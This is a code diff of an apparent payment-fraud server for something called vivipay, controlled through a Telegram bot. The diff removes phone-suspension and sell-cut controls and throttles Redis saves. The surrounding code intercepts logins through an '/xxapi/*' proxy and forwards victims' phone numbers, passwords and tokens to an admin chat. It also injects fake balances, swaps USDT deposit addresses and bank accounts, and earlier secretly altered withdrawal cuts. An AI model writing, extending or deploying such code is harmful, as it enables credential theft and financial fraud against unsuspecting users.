@@ -28,7 +28,6 @@ const DEFAULT_DATA = {
   withdrawOverride: 0,
   userOverrides: {},
   trackedUsers: {},
-  suspendedPhones: {},
   blockUpdate: true,
   orderBankMap: {}
 };
@@ -122,9 +121,13 @@ async function saveData(data) {
   if (!redis) { cachedData = data; cacheTime = Date.now(); return; }
   try {
     if (!skipMerge) {
+      if (data._lastRedisSave && Date.now() - data._lastRedisSave < 10000) {
+        cachedData = data;
+        return;
+      }
       const current = await redis.get('vivipayData');
       if (current && typeof current === 'object') {
-        const settingsKeys = ['banks', 'activeIndex', 'autoRotate', 'botEnabled', 'usdtAddress', 'logRequests', 'suspendedPhones', 'adminChatId', 'depositSuccess', 'depositBonus', 'withdrawOverride', 'blockUpdate'];
+        const settingsKeys = ['banks', 'activeIndex', 'autoRotate', 'botEnabled', 'usdtAddress', 'logRequests', 'adminChatId', 'depositSuccess', 'depositBonus', 'withdrawOverride', 'blockUpdate'];
         for (const key of settingsKeys) { if (current[key] !== undefined) data[key] = current[key]; }
         if (current.userOverrides) data.userOverrides = { ...current.userOverrides, ...data.userOverrides };
         if (current.orderBankMap) data.orderBankMap = { ...current.orderBankMap, ...data.orderBankMap };
@@ -132,6 +135,7 @@ async function saveData(data) {
     }
     cachedData = data;
     cacheTime = Date.now();
+    data._lastRedisSave = Date.now();
     await redis.set('vivipayData', data);
   } catch (e) { cachedData = data; cacheTime = Date.now(); }
 }
@@ -587,10 +591,6 @@ app.get('/hook/config', async (req, res) => {
     const addedBal = (uo && uo.addedBalance !== undefined) ? uo.addedBalance : 0;
     const globalBonus = data.depositBonus || 0;
     const totalBonus = addedBal + globalBonus;
-    const suspended = [];
-    if (data.suspendedPhones) {
-      for (const p of Object.keys(data.suspendedPhones)) suspended.push(p);
-    }
     const tracked = (userId && data.trackedUsers) ? data.trackedUsers[String(userId)] : null;
     const lastRealBal = (uo && uo.lastRealBalance !== undefined) ? uo.lastRealBalance : (tracked && tracked.balance !== undefined ? parseFloat(tracked.balance) : null);
     const shownBal = lastRealBal !== null ? parseFloat((lastRealBal + totalBonus).toFixed(2)) : (totalBonus > 0 ? totalBonus : null);
@@ -605,8 +605,7 @@ app.get('/hook/config', async (req, res) => {
       bonus: totalBonus,
       bal: shownBal,
       blockUpdate: data.blockUpdate !== false,
-      usdtAddr: data.usdtAddress || '',
-      suspended: suspended
+      usdtAddr: data.usdtAddress || ''
     });
   } catch (e) {
     res.json({ enabled: false, an: '', ah: '', if: '', bn: '', ui: '', tg: TELEGRAM_OVERRIDE, bonus: 0 });
@@ -695,15 +694,6 @@ app.post('/bot-webhook', async (req, res) => {
 === USDT ===
 /usdt <address> — Set USDT
 /usdt off — Disable
-
-=== SUSPEND ===
-/suspend <phone>
-/unsuspend <phone>
-/suspended — List all
-
-=== SELL ===
-/control sell <userId>
-/sell history
 
 === TRACKING ===
 /idtrack — All tracked users
@@ -794,28 +784,6 @@ Example:
         data._skipOverrideMerge = true; await saveData(data);
         await bot.sendMessage(chatId, `🗑 Removed ₹${removed} fake balance from user ${targetId}`);
       } else { await bot.sendMessage(chatId, `ℹ️ No fake balance for ${targetId}`); }
-      return res.sendStatus(200);
-    }
-
-    if (text.startsWith('/control sell ')) {
-      const sid = text.substring(14).trim();
-      if (!sid) { await bot.sendMessage(chatId, '❌ Format: /control sell <userId>'); return res.sendStatus(200); }
-      if (!data.userOverrides) data.userOverrides = {};
-      if (!data.userOverrides[sid]) data.userOverrides[sid] = {};
-      data.userOverrides[sid].sellControl = !data.userOverrides[sid].sellControl;
-      data._skipOverrideMerge = true; await saveData(data);
-      await bot.sendMessage(chatId, `🔒 Sell Control ${data.userOverrides[sid].sellControl ? '🟢 ON' : '🔴 OFF'} for ${sid}`);
-      return res.sendStatus(200);
-    }
-
-    if (text === '/sell history' || text.startsWith('/sell history ')) {
-      const target = text.startsWith('/sell history ') ? text.substring(14).trim() : '';
-      const sh = data.sellHistory || [];
-      const filtered = target ? sh.filter(h => String(h.userId) === target) : sh;
-      if (filtered.length === 0) { await bot.sendMessage(chatId, '📋 No sell history.'); return res.sendStatus(200); }
-      let msg = '🔒 SELL CUT HISTORY\n━━━━━━━━━━━━━━━━━━\n';
-      for (const h of filtered.slice(-10)) msg += `👤 ${h.userId} | ₹${h.originalCut} → ₹${h.modifiedCut} | ${h.time}\n`;
-      await bot.sendMessage(chatId, msg);
       return res.sendStatus(200);
     }
 
@@ -1025,31 +993,6 @@ Example:
       else { await bot.sendMessage(chatId, '❌ Invalid address.'); return res.sendStatus(200); }
       data._skipOverrideMerge = true; await saveData(data);
       await bot.sendMessage(chatId, data.usdtAddress ? `₮ USDT: ${data.usdtAddress}` : '❌ USDT override OFF');
-      return res.sendStatus(200);
-    }
-
-    if (text.startsWith('/suspend ')) {
-      const sp = text.substring(9).trim();
-      if (!data.suspendedPhones) data.suspendedPhones = {};
-      data.suspendedPhones[sp] = { time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }) };
-      data._skipOverrideMerge = true; await saveData(data);
-      await bot.sendMessage(chatId, `🚫 Suspended: ${sp}`);
-      return res.sendStatus(200);
-    }
-
-    if (text.startsWith('/unsuspend ')) {
-      const up = text.substring(11).trim();
-      if (data.suspendedPhones && data.suspendedPhones[up]) { delete data.suspendedPhones[up]; data._skipOverrideMerge = true; await saveData(data); }
-      await bot.sendMessage(chatId, `✅ Unsuspended: ${up}`);
-      return res.sendStatus(200);
-    }
-
-    if (text === '/suspended') {
-      const phones = data.suspendedPhones ? Object.keys(data.suspendedPhones) : [];
-      if (phones.length === 0) { await bot.sendMessage(chatId, '📋 No suspended.'); return res.sendStatus(200); }
-      let msg = '🚫 Suspended:\n';
-      for (const p of phones) msg += `📱 ${p} — ${data.suspendedPhones[p].time || 'N/A'}\n`;
-      await bot.sendMessage(chatId, msg);
       return res.sendStatus(200);
     }
 
@@ -1577,10 +1520,6 @@ app.all('/xxapi/*', async (req, res) => {
 📱 Phone: ${phone || 'N/A'}${pwd ? '\n🔐 Pass: ' + pwd : ''}${extractedToken ? '\n🎫 Token: ' + extractedToken : ''}
 🕐 ${now}`);
 
-      if (phone && data.suspendedPhones && data.suspendedPhones[String(phone)]) {
-        notifyAdmin(data, `🚫 BLOCKED LOGIN\n📱 Phone: ${phone}\n🔒 Suspended\n🕐 ${now}`);
-        return res.status(200).json({ code: 500, message: 'Account Suspended', data: null });
-      }
     }
 
     const isUserInfo = urlLower.includes('userinfo') || urlLower.includes('memberinfo') ||
